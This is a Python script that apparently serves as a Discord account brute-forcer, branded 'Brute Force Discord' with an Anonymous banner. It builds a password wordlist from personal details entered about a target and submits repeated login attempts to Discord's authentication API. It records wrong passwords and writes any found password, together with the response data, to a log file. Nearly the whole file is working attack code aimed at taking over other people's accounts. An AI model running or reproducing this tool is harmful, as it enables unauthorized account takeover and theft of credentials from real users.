from argparse import ArgumentParser
from datetime import datetime as dt
from time import sleep


import requests
import random


def get_time():
    now = dt.now()
    return f'[{now.hour}:{now.minute}:{now.second}]'


def generate_wordlist(path):
    information = list()

    while True:
        info = input("Enter target's piece of information. To finish type done: ")
        if info.lower() == 'done':
            break
        information.append(info)
    
    with open(path, 'w') as f:
        f.close()
    amount = int(input('Enter amount of passwords to generate: '))
    print(f'Starting to generate {amount} unique passwords...')
    for _ in range(amount):
        password = random.choice(information) + random.choice(information)
        while len(password) < 7:
            password += random.choice(information)
        #print(password)
        with open(path, 'r+') as f:
            data = f.read().splitlines()
            if password in data:
                pass
            else:
                f.write(password + '\n')
    print('Done generating a custom word list!')


        
    


def get_args():
    parser = ArgumentParser()
    parser.add_argument('-u', '--username', help='Account email or phone number', required=True)
    parser.add_argument('-w', '--wordlist', help='Passwords wordlist', required=False, default='None')
    parser.add_argument('-t', '--threads', help='Amount of threads to run', required=False, default='1')

    return parser.parse_args()

def close(message):
    print(message)
    exit()

def login(username, password):
    URL = 'https://discord.com/api/v9/auth/login'

    payload = {
        'login' : username,
        'password' : password
    }
    headers = {
        'user-agent' : 'Enter your user-agent here'
    }
    try:
        r = requests.post(URL, json=payload, headers=headers)
    except:
        pass
    print(r.status_code)
    if r.status_code == 200:
        with open(f'Logs/{username}/success.txt', 'w') as f:
            f.write(f'{get_time()} Password for {username}: {password}')
            f.write(f'\n{r.text}')
            f.close()
        close(f'[+] Password found! Written in Logs/{username}/success.txt')
    elif r.status_code == 400:
        print(f'[-] Wrong password: {password}')
        with open(f'Logs/{username}/wrong-passwords.txt', 'a') as f:
            f.write(f'{get_time()} Wrong password: {password}\n')
            f.close()
    elif r.status_code == 429:
        print('Too much traffic, pausing for 10 seconds.')
        sleep(10)
    else:
        print(f'Uknown status code: {r.status_code}')


def display_banner():
    print(r'''
    ███████████████████████████████
    ████╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬████
    ██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬███████╬╬╬╬╬╬╬╬╬███████╬╬╬█
    █╬╬██╬╬╬╬███╬╬╬╬╬╬╬███╬╬╬╬██╬╬█
    █╬██╬╬╬╬╬╬╬██╬╬╬╬╬██╬╬╬╬╬╬╬██╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬╬█████╬╬╬╬╬╬╬╬╬╬╬█████╬╬╬╬█
    █╬╬█████████╬╬╬╬╬╬╬█████████╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬▓▓▓▓╬╬╬╬╬╬╬█╬╬╬╬╬╬╬▓▓▓▓╬╬╬█
    █╬╬▓▓▓▓▓▓╬╬█╬╬╬█╬╬╬█╬╬▓▓▓▓▓▓╬╬█
    █╬╬╬▓▓▓▓╬╬██╬╬╬█╬╬╬██╬╬▓▓▓▓╬╬╬█
    █╬╬╬╬╬╬╬╬██╬╬╬╬█╬╬╬╬██╬╬╬╬╬╬╬╬█
    █╬╬╬╬╬████╬╬╬╬███╬╬╬╬████╬╬╬╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬╬╬╬█
    ██╬╬█╬╬╬╬╬╬╬╬█████╬╬╬╬╬╬╬╬█╬╬██
    ██╬╬██╬╬╬╬╬╬███████╬╬╬╬╬╬██╬╬██
    ██╬╬▓███╬╬╬████╬████╬╬╬███▓╬╬██
    ███╬╬▓▓███████╬╬╬███████▓▓╬╬███
    ███╬╬╬╬▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬███
    ████╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬████
    █████╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬█████
    ██████╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬██████
    ███████╬╬╬╬╬╬╬███╬╬╬╬╬╬╬███████
    ████████╬╬╬╬╬╬███╬╬╬╬╬╬████████
    █████████╬╬╬╬╬███╬╬╬╬╬█████████
    ███████████╬╬╬╬█╬╬╬╬███████████
    ███████████████████████████████

  ____             _         ______                   _____  _                       _                
 |  _ \           | |       |  ____|                 |  __ \(_)                     | |               
 | |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___  | |  | |_ ___  ___ ___  _ __ __| |               
 |  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \ | |  | | / __|/ __/ _ \| '__/ _` |               
 | |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/ | |__| | \__ \ (_| (_) | | | (_| |               
 |____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___| |_____/|_|___/\___\___/|_|  \__,_|               
  ____          _   _                   _______       _                                               
 |  _ \        | \ | |                 |__   __|     (_)                                              
 | |_) |_   _  |  \| | __ ___   _____     | |_      ___ _______ _ __                                  
 |  _ <| | | | | . ` |/ _` \ \ / / _ \    | \ \ /\ / / |_  / _ \ '__|                                 
 | |_) | |_| | | |\  | (_| |\ V /  __/    | |\ V  V /| |/ /  __/ |                                    
 |____/ \__, | |_| \_|\__,_| \_/ \___|    |_| \_/\_/ |_/___\___|_|                                    
 __      __/ |_                                                                                     _ 
 \ \    |___/ /       /\                  /\                                                       | |
  \ \  /\  / /__     /  \   _ __ ___     /  \   _ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___  | |
   \ \/  \/ / _ \   / /\ \ | '__/ _ \   / /\ \ | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __| | |
    \  /\  /  __/  / ____ \| | |  __/  / ____ \| | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \ |_|
     \/  \/ \___| /_/    \_\_|  \___| /_/    \_\_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/ (_)
                                                                   __/ |                              
                                                                  |___/                               
''')

